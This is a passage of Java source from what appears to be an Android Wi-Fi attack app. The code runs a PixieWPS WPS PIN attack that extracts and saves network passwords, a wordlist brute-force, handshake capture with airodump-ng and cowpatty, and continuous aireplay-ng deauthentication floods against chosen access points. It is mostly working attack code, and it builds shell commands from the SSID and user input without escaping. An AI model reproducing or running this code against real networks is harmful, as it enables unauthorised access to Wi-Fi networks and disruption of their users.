                            appendToTerminal(info("Using interface: " + underline(interfaceName)), terminal);
                            appendToTerminal(info("Please wait..."), terminal);
                            String command = "python3 -u /CORE/PixieWps/pixie.py -b "+item.getBssid()+" -i "+interfaceName+" -p "+input.getText().toString();
                            
                            if (preferences.getBoolean("iface_down")) {
                                command += " --iface-down ";
                                appendToTerminal(info("Setting interface down..."), terminal);
                                new ExecutorBuilder()
                                        .setCommand("svc wifi disable")
                                        .setChroot(false)
                                        .setActivity(preferences.getActivity())
                                        .execute();
                            } else {
                                appendToTerminal(info("Interface will not be set down... [Change in settings if you need it]"), terminal);
                            }
                            ExecutorBuilder executorBuilder = new ExecutorBuilder()
                                    .setCommand(command)
                                    .setChroot(true)
                                    .setActivity(preferences.getActivity())
                                    .setOutput(s -> appendToTerminal(s, terminal))
                                    .setError(s -> appendToTerminal(danger(s), terminal))
                                    .setOnFinished(strings -> {
                                        log.setVisibility(View.VISIBLE);
                                        appendToTerminal(info("Attack finished!"), terminal);
                                        dialog.setCancelable(true);
                                        button.setText(R.string.exit_attack);
                                        button.setOnClickListener(v2 -> dialog.dismiss());
                                        
                                        if (preferences.getBoolean("iface_down")) {
                                            appendToTerminal(info("Setting interface up..."), terminal);
                                            new ExecutorBuilder()
                                                    .setCommand("svc wifi enable")
                                                    .setChroot(false)
                                                    .setActivity(preferences.getActivity())
                                                    .execute();
                                        }
                                        boolean pinFound = false;
                                        boolean pskFound = false;
                                        String pass = "";
                                        String pin = "";
                                        for (String s : strings) {
                                            if (s.toLowerCase().contains(("[+] WPS PIN:").toLowerCase())) {
                                                Matcher m = Pattern.compile("([0-9]{8})").matcher(s);
                                                if (m.find()) {
                                                    item.setPin(m.group());
                                                    pin = m.group();
                                                    pinFound = true;
                                                }
                                            }
                                            if (s.toLowerCase().contains(("[+] WPA PSK:").toLowerCase())) {
                                                pass = s.split(":")[1].replace("'","").trim();
                                                item.setPassword(pass);
                                                pskFound = true;
                                            }
                                        }
                                        if (pinFound && pskFound) {
                                            preferences.addWifi(item);
                                            String finalPass = pass;
                                            preferences.dialog("Network vulnerable!", "Pin and password has been found and saved to the database!\nPassword: " + pass, "OK", "Copy", R.drawable.wifi, aBoolean -> {
                                                if (!aBoolean) {
                                                    copyToClipboard(itemView.getContext(), finalPass);
                                                }else{
                                                    dialog.dismiss();
                                                }
                                            });
                                        }
                                    });
                            executorBuilder.execute();
                            button.setText(R.string.stop_attack);
                            button.setOnClickListener(v1 -> {
                                dialog.setCancelable(true);
                                appendToTerminal(warning("Stopping Own Pin attack..."), terminal);
                                executorBuilder.kill();
                                
                                if (preferences.getBoolean("iface_down")) {
                                    appendToTerminal(info("Setting interface up..."), terminal);
                                    new ExecutorBuilder()
                                            .setCommand("svc wifi enable")
                                            .setChroot(false)
                                            .setActivity(preferences.getActivity())
                                            .execute();
                                }

                            });
                        }
                    });
                    break;
                case 4:
                    attackName.setText(R.string.password_brute_attack);
                    attackIcon.setImageResource(R.drawable.passwd_brute);
                    attackLayout.setOnClickListener(v -> {
                        MaterialAlertDialogBuilder builder = new MaterialAlertDialogBuilder(itemView.getContext());
                        builder.setTitle(R.string.password_brute_attack);
                        builder.setMessage(R.string.password_brute_desc);
                        builder.setPositiveButton(R.string.ok, (dialog1, which) -> dialog1.dismiss());
                        builder.show();
                    });
                    listenerLayout.setVisibility(View.GONE);
                    deauthLayout.setVisibility(View.GONE);
                    inputLayout.setVisibility(View.VISIBLE);
                    inputLayout.setFocusedByDefault(true);

                    //set input mode to none
                    input.setInputType(0);
                    input.setOnClickListener(v -> {
                        Log.d("WifiAdapter", "onClick: ");
                        SuUtils suUtils = new SuUtils();
                        suUtils.getFileNames(Preferences.getInstance().getActivity(), "/sdcard/Stryker5/wordlists", strings -> {
                            if (strings.isEmpty()) {
                                appendToTerminal(danger("No wordlists found in /sdcard/Stryker5/wordlists"), terminal);
                            }else {
                                preferences.dialogChooser(R.drawable.chroot_manager, "Choose wordlist", "wordlist", strings, s -> input.setText(s));
                            }
                        });
                    });
                    inputLayout.setOnClickListener(v -> {
                        Log.d("WifiAdapter", "onClick: ");
                        SuUtils suUtils = new SuUtils();
                        suUtils.getFileNames(Preferences.getInstance().getActivity(), "/sdcard/Stryker5/wordlists", strings -> {
                            if (strings.isEmpty()) {
                                appendToTerminal(danger("No wordlists found in /sdcard/Stryker5/wordlists"), terminal);
                            }else {
                                preferences.dialogChooser(R.drawable.chroot_manager, "Choose wordlist", "wordlist", strings, s -> input.setText(s));
                            }
                        });
                    });
                    inputLayout2.setOnClickListener(v -> {
                        Log.d("WifiAdapter", "onClick: ");
                        SuUtils suUtils = new SuUtils();
                        suUtils.getFileNames(Preferences.getInstance().getActivity(), "/sdcard/Stryker5/wordlists", strings -> {
                            if (strings.isEmpty()) {
                                appendToTerminal(danger("No wordlists found in /sdcard/Stryker5/wordlists"), terminal);
                            }else {
                                preferences.dialogChooser(R.drawable.chroot_manager, "Choose wordlist", "wordlist", strings, s -> input.setText(s));
                            }
                        });
                    });
                    inputLayout2.setHint("Wordlist path");

                    button.setOnClickListener(v -> {
                        ExecutorBuilder bruter = new ExecutorBuilder();
                        bruter.setChroot(false);
                        bruter.setActivity(preferences.getActivity());
                        bruter.setCommand("/data/data/com.zalexdev.stryker5/files/bash /data/data/com.zalexdev.stryker5/files/swb.sh -s \""+item.getSsid()+"\" -p "+item.getSignalDbm()+" -w /sdcard/Stryker5/wordlists/"+input.getText().toString());
                        Log.d("WifiAdapter", "onClick: bash /data/data/com.zalexdev.stryker5/files/swb.sh -s "+item.getSsid().replace(" ","~~~")+" -p "+item.getSignalDbm()+" -w /sdcard/Stryker5/wordlists/"+input.getText().toString());
                        bruter.setOutput(s -> appendToTerminal(s, terminal));
                        bruter.setError(s -> appendToTerminal(danger(s), terminal));
                        bruter.setOnFinished(strings -> {
                            log.setVisibility(View.VISIBLE);
                            appendToTerminal(info("Attack finished!"), terminal);
                            dialog.setCancelable(true);
                            button.setText(R.string.exit_attack);
                            button.setOnClickListener(v2 -> dialog.dismiss());
                            if (ExecutorBuilder.contains(strings, "Password found:")){
                                String password = "";
                                for (String s : strings) {
                                    if (s.contains("Password found:")) {
                                        password = s.replace("Password found: ", "");
                                    }
                                }
                                String finalPassword = password;
                                preferences.dialog( "Password found", "Script detected password: "+password, "Copy", "OK",R.drawable.passwd, aBoolean -> {
                                    if (aBoolean) {
                                        copyToClipboard(Preferences.getInstance().getContext(), finalPassword);
                                    }
                                });
                            }
                        });
                        bruter.execute();
                        button.setText(R.string.stop_attack);
                        button.setOnClickListener(v1 -> {
                            dialog.setCancelable(true);
                            appendToTerminal(warning("Stopping Password Brute Force attack..."), terminal);
                            bruter.kill();
                        });
                    });

                    break;
                case 5:
                    attackName.setText(R.string.handshake_capture_attack);
                    attackIcon.setImageResource(R.drawable.hs_capture);
                    attackLayout.setOnClickListener(v -> {
                        MaterialAlertDialogBuilder builder = new MaterialAlertDialogBuilder(itemView.getContext());
                        builder.setTitle(R.string.handshake_capture_attack);
                        builder.setMessage( R.string.hs_capture_desc);
                        builder.setPositiveButton(R.string.ok, (dialog1, which) -> dialog1.dismiss());
                        builder.show();
                    });
                    Timer timer_deauth = new Timer();
                    Timer timer_cowpatty = new Timer();
                    ExecutorBuilder airodump = new ExecutorBuilder();

                    ExecutorBuilder deauth = new ExecutorBuilder();
                    airodump.setNoLog(true);
                    AtomicBoolean isRunning = new AtomicBoolean(false);
                    button.setOnClickListener(v -> {
                        String interfaceName = preferences.getListenerInterface();
                        String deauthInterface = preferences.getDeauthInterface();

                        if (interfaceName.length() <3) {
                            appendToTerminal(danger("No interface selected!"), terminal);
                        }else  {
                            dialog.setCancelable(false);
                            listenerLayout.setVisibility(View.GONE);
                            deauthLayout.setVisibility(View.GONE);
                            appendToTerminal(info("Starting Handshake Capture attack on " + underline(item.getSsid()) + "..."), terminal);
                            appendToTerminal(info("Using interface: " + underline(interfaceName)), terminal);
                            appendToTerminal(info("Please wait..."), terminal);
                            String command = "airodump-ng --ignore-negative-one --write-interval 1 --background 1 --bssid " + item.getBssid() + " -c " + item.getPrimaryChannel() + " --write /sdcard/.temp/ --output-format pcap " + interfaceName;
                            String cowpattyCommand = "cowpatty -r /sdcard/.temp/-01.cap -c";
                            String deauthCommand = "aireplay-ng  --ignore-negative-one --deauth 10 -a " + item.getBssid() + " " + deauthInterface;
                            SuUtils suUtils = new SuUtils();

                            if (preferences.getBoolean("iface_down") && preferences.getListenerInterface().equals("wlan0") || preferences.getBoolean("iface_down") && preferences.getDeauthInterface().equals("wlan0")) {
                                appendToTerminal(info("Setting interface down..."), terminal);
                                new ExecutorBuilder()
                                        .setCommand("svc wifi disable")
                                        .setChroot(false)
                                        .setActivity(preferences.getActivity())
                                        .execute();
                            } else {
                                appendToTerminal(info("Interface will not be set down... [Change in settings if you need it]"), terminal);
                            }

                            button.setText(R.string.stop_attack);
                            button.setOnClickListener(v1 -> {
                                dialog.setCancelable(true);
                                button.setText(R.string.exit_attack);
                                log.setVisibility(View.VISIBLE);
                                appendToTerminal(warning("Stopping Handshake Capture attack..."), terminal);
                                airodump.kill();
                                deauth.kill();
                                timer_deauth.cancel();
                                timer_cowpatty.cancel();
                                ExecutorBuilder kill = new ExecutorBuilder();
                                kill.setCommand("pkill airodump-ng");
                                kill.setChroot(true);
                                kill.setActivity(Preferences.getInstance().getActivity());
                                kill.execute();
                                if (preferences.getBoolean("iface_down") && preferences.getListenerInterface().equals("wlan0") || preferences.getBoolean("iface_down") && preferences.getDeauthInterface().equals("wlan0")) {
                                    appendToTerminal(info("Setting interface up..."), terminal);
                                    new ExecutorBuilder()
                                            .setCommand("svc wifi enable")
                                            .setChroot(false)
                                            .setActivity(preferences.getActivity())
                                            .execute();
                                }
                                button.setOnClickListener(v2 -> dialog.dismiss());
                            });

                            new Thread(() -> {
                                boolean first = false;
                                boolean second = false;
                               if (interfaceName.equals("wlan0")){
                                   first = SuUtils.setMonitorModeWlan0();
                               } else {
                                    first = SuUtils.setMonitorModeWlan1(interfaceName);
                               }
                               if (!interfaceName.equals(deauthInterface)) {
                                   if (deauthInterface.equals("wlan0")) {
                                       second = SuUtils.setMonitorModeWlan0();
                                   } else {
                                       second = SuUtils.setMonitorModeWlan1(deauthInterface);
                                   }
                               }else{
                                    second = first;
                               }
                                  if (first && second) {
                                      appendToTerminal(info("Monitor mode set for both interfaces!"), terminal);
                                      SuUtils.removeFile("/sdcard/Stryker5/.temp/-01.cap");
                                      //start airodump
                                      airodump.setChroot(true)
                                              .setCommand(command)
                                              .setOnFinished(strings -> {
                                                  appendToTerminal("Airodump-ng finished", terminal);
                                                  new Thread(() -> {
                                                      appendToTerminal(info("Setting managed mode for interfaces..."), terminal);
                                                      if (interfaceName.equals("wlan0")){
                                                          SuUtils.setManagedModeWlan0();
                                                      }else{
                                                          SuUtils.setManagedModeWlan1(interfaceName);
                                                      }
                                                      if (deauthInterface.equals("wlan0") && !interfaceName.equals("wlan0")){
                                                          SuUtils.setManagedModeWlan0();
                                                      }else if (!deauthInterface.equals("wlan0") && !interfaceName.equals(deauthInterface)){
                                                          SuUtils.setManagedModeWlan1(deauthInterface);
                                                      }

                                                      if (preferences.getBoolean("iface_down") && preferences.getListenerInterface().equals("wlan0") || preferences.getBoolean("iface_down") && preferences.getDeauthInterface().equals("wlan0")) {
                                                          appendToTerminal(info("Setting wlan0 interface up..."), terminal);
                                                          new ExecutorBuilder()
                                                                  .setCommand("svc wifi enable")
                                                                  .setChroot(false)
                                                                  .setActivity(preferences.getActivity())
                                                                  .execute();
                                                      }
                                                  }).start();

                                              })
                                              .setActivity(preferences.getActivity());
                                      airodump.execute();
                                      appendToTerminal("Starting airodump-ng...", terminal);
                                      isRunning.set(true);
                                      timer_cowpatty.schedule(new TimerTask() {
                                          @Override
                                          public void run() {
                                              ExecutorBuilder cowpatty = new ExecutorBuilder();
                                              cowpatty.setCommand(cowpattyCommand)
                                                      .setChroot(true);
                                              cowpatty.setActivity(Preferences.getInstance().getActivity());
                                              cowpatty.setOnFinished(strings -> {
                                                  if (ExecutorBuilder.contains(strings,"collected all")){
                                                      try {
                                                          timer_deauth.cancel();
                                                      } catch (Exception e){
                                                          Log.d("Wifi","failed to stop deauth timer");
                                                      }
                                                      ExecutorBuilder kill = new ExecutorBuilder();
                                                      kill.setCommand("pkill airodump-ng");
                                                      kill.setChroot(true);
                                                      kill.setActivity(Preferences.getInstance().getActivity());
                                                      airodump.kill();
                                                      kill.execute();
                                                      dialog.dismiss();
                                                      cowpatty.kill();
                                                      timer_cowpatty.cancel();
                                                      ExecutorBuilder.runCommandChroot("mv /sdcard/.temp/-01.cap /sdcard/handshakes/"+item.getSsid().replace(" ","_")+".cap");
                                                      Preferences.getInstance().dialog("Handshake captured", "Handshake captured successfully! And stored into "+"/sdcard/Stryker5/handshakes/"+item.getSsid().replace(" ","_")+".cap"+" Click 'copy' to copy path ","OK","Copy",R.drawable.hs_capture, aBoolean -> {
                                                          if (!aBoolean) {
                                                              copyToClipboard(Preferences.getInstance().getContext(), "/sdcard/Stryker5/handshakes/"+item.getSsid().replace(" ","_")+".cap");
                                                          }
                                                      });
                                                  }else {
                                                      Preferences.getInstance().getActivity().runOnUiThread(() -> appendToTerminal("Handshake not captured yet...", terminal));
                                                  }
                                              });
                                              cowpatty.execute();
                                          }
                                      },5000,15000);
                                      timer_deauth.schedule(new TimerTask() {
                                          @Override
                                          public void run() {
                                              if (!interfaceName.equals("wlan0")){

                                              deauth.setChroot(true)
                                                      .setCommand(deauthCommand)
                                                      .setActivity(Preferences.getInstance().getActivity());
                                              deauth.execute();
                                              appendToTerminal("Sending deauth packets...", terminal);}
                                          }
                                      }, 1000, 10000);
                                  }else {
                                      appendToTerminal(danger("Failed to set monitor mode for interfaces! If wifi is down, reboot your device"), terminal);
                                  }
                            }).start();



                        }
                    });

                    break;
                case 6:
                    attackName.setText(R.string.devices_deauth_attack);
                    attackIcon.setImageResource(R.drawable.deauth);
                    attackLayout.setOnClickListener(v -> {
                        MaterialAlertDialogBuilder builder = new MaterialAlertDialogBuilder(itemView.getContext());
                        builder.setTitle(R.string.devices_deauth_attack);
                        builder.setMessage( R.string.devices_deauth_desc);
                        builder.setPositiveButton(R.string.ok, (dialog1, which) -> dialog1.dismiss());
                        builder.show();
                    });
                    listenerLayout.setVisibility(View.GONE);
                    button.setText(R.string.start_attack);
                    button.setOnClickListener(v -> {
                        deauthLayout.setVisibility(View.GONE);
                        String deauthInterface = preferences.getDeauthInterface();
                        new Thread(() -> {
                            boolean ok = SuUtils.setMonitorModeWlan1(deauthInterface);
                            if (ok) {
                                ExecutorBuilder.runCommandChroot("iw dev "+deauthInterface+" set channel "+item.getPrimaryChannel());
                                preferences.getActivity().runOnUiThread(() -> {
                                    appendToTerminal(info("Monitor mode set for interface: " + underline(deauthInterface)), terminal);
                                    String deauthCommand = "aireplay-ng  --ignore-negative-one --deauth 0 -a " + item.getBssid() + " " + deauthInterface;
                                    ExecutorBuilder deauth1 = new ExecutorBuilder();
                                    deauth1.setChroot(true)
                                            .setCommand(deauthCommand)
                                            .setActivity(preferences.getActivity())
                                            .setOutput(s -> appendToTerminal(s, terminal))
                                            .setError(s -> appendToTerminal(danger(s), terminal))
                                            .setOnFinished(strings -> {
                                                log.setVisibility(View.VISIBLE);
                                                appendToTerminal(info("Attack finished!"), terminal);
                                                dialog.setCancelable(true);
                                                button.setText(R.string.exit_attack);
                                                button.setOnClickListener(v2 -> dialog.dismiss());
                                            });
                                    deauth1.execute();
                                    button.setText(R.string.stop_attack);
                                    button.setOnClickListener(v1 -> {
                                        dialog.setCancelable(true);
                                        log.setVisibility(View.VISIBLE);
                                        appendToTerminal(warning("Stopping Deauth attack..."), terminal);
                                        deauth1.kill();
                                    });
                                });

                            }else {
                                appendToTerminal(danger("Failed to set monitor mode for interface: " + underline(deauthInterface)), terminal);
                            }

                        }).start();

                    });




                    break;

            }
            dialog.show();
        }

        public void dialogInfo(WifiNetwork item){
            MaterialAlertDialogBuilder builder = new MaterialAlertDialogBuilder(itemView.getContext());
            builder.setTitle(item.ssid);
            builder.setMessage(item.generateDialogText());
            builder.setPositiveButton("OK", (dialog, which) -> dialog.dismiss());
            builder.setNegativeButton("Copy", (dialog, which) -> copyToClipboard(itemView.getContext(), item.generateDialogText()));
            builder.show();
        }

        public void appendToTerminal(String text, TextView terminal) {
            Log.d("WifiAdapter", "appendToTerminal: "+text);
            if (preferences.isHideSSID()){
                for (String s : hidenNames) {
                    if (text.contains(s)){
                        text = text.replace(s, "HIDDEN SSID");
                    }
                }
            }
            if (preferences.isHideMac()){
                Matcher m = Pattern.compile("((\\w{2}:){5}\\w{2})").matcher(text);
                while (m.find()) {
                    text = text.replace(m.group(), "XX:XX:XX:XX:XX:XX");
                }
            }
            terminal.append(convert(text+"<br>"));
        }

        public void spaceToTerminal(TextView terminal) {
            terminal.append("\n");
        }

        public boolean containsPin(String pin){
            Pattern pattern = Pattern.compile("\\b\\d{8}\\b");
            Matcher matcher = pattern.matcher(pin);
            return matcher.find();
        }

        public String getPin(String text){
            Pattern pattern = Pattern.compile("\\b\\d{8}\\b");
            Matcher matcher = pattern.matcher(text);
            if (matcher.find()) {
                return matcher.group();
            }else {
                return null;
            }
        }

        public ArrayList<String> getPins(ArrayList<String> list){
            ArrayList<String> pins = new ArrayList<>();
            for (String s : list) {
                if (containsPin(s)) {
                    pins.add(getPin(s));
                }
            }
            return pins;
        }

    }


}
